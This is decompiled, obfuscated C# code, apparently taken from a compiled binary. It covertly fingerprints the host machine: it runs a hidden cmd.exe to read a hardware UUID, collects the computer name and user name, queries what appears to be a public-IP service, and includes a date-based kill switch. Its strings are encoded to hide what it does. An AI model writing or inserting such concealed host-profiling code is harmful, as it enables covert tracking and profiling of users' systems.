using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

internal class Class6
{
	private class Class7 : IDisposable
	{
		private Process process_0;

		private StreamWriter streamWriter_0;

		private AutoResetEvent autoResetEvent_0;

		private string string_0;

		public Class7(string string_1)
		{
			process_0 = new Process();
			autoResetEvent_0 = new AutoResetEvent(initialState: false);
			string_0 = string.Empty;
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = string_1,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardInput = true,
				CreateNoWindow = true
			};
			process_0.OutputDataReceived += process_0_OutputDataReceived;
			process_0.StartInfo = startInfo;
			process_0.Start();
			streamWriter_0 = process_0.StandardInput;
			process_0.BeginOutputReadLine();
		}

		public void Dispose()
		{
			process_0.Close();
			process_0.Dispose();
			streamWriter_0.Close();
			streamWriter_0.Dispose();
		}

		public string method_0(string string_1)
		{
			string_0 = string.Empty;
			streamWriter_0.WriteLine(string_1);
			streamWriter_0.WriteLine(Class11.smethod_0("\uf8ba\uf8bc\uf8b7\uf8b0\uf8ff\uf8ba\uf8b1\uf8bb", 63695));
			autoResetEvent_0.WaitOne();
			return string_0;
		}

		private void process_0_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			if (e.Data == null || e.Data == Class11.smethod_0("\uf29a\uf291\uf29b", 62207))
			{
				autoResetEvent_0.Set();
			}
			else
			{
				string_0 = string_0 + e.Data + Environment.NewLine;
			}
		}
	}

	private static Class2 class2_0;

	public static string smethod_0()
	{
		string result = string.Empty;
		try
		{
			using Class7 @class = new Class7(Class11.smethod_0("\ue3bc\ue3b2\ue3bb\ue3f1\ue3ba\ue3a7\ue3ba", 58201));
			string text = @class.method_0(Class11.smethod_0("\uf6c9\uf6d3\uf6d7\uf6dd\uf69e\uf6dd\uf6cd\uf6ce\uf6cc\uf6d1\uf6da\uf6cb\uf6dd\uf6ca\uf69e\uf6d9\uf6db\uf6ca\uf69e\uf6cb\uf6cb\uf6d7\uf6da", 63142));
			result = text.Split(new char[1] { '\n' })[6];
		}
		catch (Exception ex)
		{
			class2_0.method_4(ex.Message);
		}
		return result;
	}

	public static List<string> smethod_1()
	{
		List<string> list = new List<string>();
		string environmentVariable = Environment.GetEnvironmentVariable(Class11.smethod_0("\ue438\ue434\ue436\ue42b\ue42e\ue42f\ue43e\ue429\ue435\ue43a\ue436\ue43e", 58459));
		string environmentVariable2 = Environment.GetEnvironmentVariable(Class11.smethod_0("\uf6aa\uf68c\uf69a\uf68d\uf6b1\uf69e\uf692\uf69a", 63182));
		list.Add(environmentVariable);
		list.Add(environmentVariable2);
		return list;
	}

	public static string smethod_2()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		string result = string.Empty;
		try
		{
			HttpClient val = new HttpClient();
			try
			{
				Task<HttpResponseMessage> async = val.GetAsync(Class11.smethod_0("\uf695\uf689\uf689\uf68d\uf68e\uf6c7\uf6d2\uf6d2\uf69c\uf68d\uf694\uf6d3\uf694\uf68d\uf694\uf69b\uf684\uf6d3\uf692\uf68f\uf69a", 63192));
				Task<string> task = async.Result.get_Content().ReadAsStringAsync();
				result = task.Result;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			class2_0.method_4(ex.Message);
		}
		return result;
	}

	static Class6()
	{
		if (DateTime.Now > new DateTime(637618728382854051L))
		{
			throw new Exception();
		}
		class2_0 = new Class2(Class11.smethod_0("\uef99\uef98\uef9f\uef88\uef9a", 61340), 0);
	}
}
